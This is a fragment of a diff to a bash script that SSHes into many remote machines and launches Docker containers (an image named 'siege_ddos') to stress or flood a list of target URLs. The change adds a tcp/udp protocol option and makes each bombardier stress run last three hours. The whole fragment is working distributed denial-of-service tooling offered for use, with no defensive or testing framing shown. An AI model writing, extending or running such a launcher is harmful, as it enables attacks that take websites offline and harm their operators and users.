@@ -1,7 +1,7 @@
 
 usage() {
     cat <<EOF
-bash $1 --url list.txt [--nj 1000] [--attack stress|flood]
+bash $1 --url list.txt [--nj 1000] [--attack stress|flood] [--protocol tcp|udp]
 EOF
 }
 
@@ -55,7 +55,7 @@ nj_per_machine=$(echo $((nj / urls_num)))
 for url in $(cat $url_list); do
   for ip in $(cat $ips_path); do
     if [ "$attack" == "stress" ]; then
-      ssh ubuntu@${ip} docker run -d myuatools/siege_ddos bombardier -c $nj_per_machine -l $url
+      ssh ubuntu@${ip} docker run -d myuatools/siege_ddos bombardier -d 3h -c $nj_per_machine -l $url
     elif [ "$attack" == "flood" ]; then
       url_only=$(echo $url | perl -nle '/(.+)(\:\d+)/; print $1')
       if [ -z "$url_only" ]; then
